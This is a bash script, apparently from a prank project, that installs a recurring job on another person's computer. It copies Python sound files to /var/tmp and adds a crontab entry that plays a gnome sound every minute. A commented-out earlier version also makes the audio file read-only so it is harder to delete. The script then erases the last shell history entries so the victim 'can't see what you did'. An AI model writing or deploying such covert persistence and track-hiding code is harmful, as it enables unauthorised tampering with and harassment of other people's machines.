#!/bin/bash

# Run this script to set up torture.sh on the user's crontab

# this is where the audio file will be stored
# If you're feeling particularly devious, you can change the path or even the file name
# # Note that on MacOS, files in HOME will likely be protected and crontab will be unable to access them without explicit permissions
# audio_path="/var/tmp/gnome"

# if [[ ! -f "$audio_path" ]]; then
#     cp gnome.mp3 "$audio_path"
#     chmod 444 "$audio_path" # make sure that it can be played, and also make it harder for them to delete
# fi

# # Keep existing crontab and add this command to the end:
# # Every minute play the joyous sound
# crontab -l | {
#     cat
#     echo "* * * * * export XDG_RUNTIME_DIR=\"/run/user/1000\" && mpg123 -q \"$audio_path\" &>> /Users/addisongoolsbee/Desktop/cron.log && echo hello >> /Users/addisongoolsbee/Desktop/cron.log"
# } | crontab -

#!/bin/bash

# Location to store code and sound effect

code_loc="/var/tmp/gnome-torture"

# User must have python3 on their system

python_loc=$(which python3)
original_dir=$(pwd)
gnome_dir=$(dirname "$0")
cd "$gnome_dir"

if [[ ! -d "$code_loc" ]]; then
    echo "creating directory $code_loc"
    mkdir "$code_loc"
    chmod +w "$code_loc"
    cp -t "$code_loc" "${gnome_dir}/gnome" "${gnome_dir}/mpg123.py" "${gnome_dir}/sound.py"
fi

# Make sure to see here that you don't add multiple of the identical corntabs, unless that's what you want
# Type crontab -l to see all the current cron jobs, and type crontab -r to delete all cron jobs
command="${python_loc} ${code_loc}/sound.py"

(
    crontab -l
    echo "* * * * * $command"
) | crontab -

# Clear the last few history commands so they can't see what you did
# Because of this, you must run this script with ". run.sh" instead of "./run.sh"
history -d -5--1
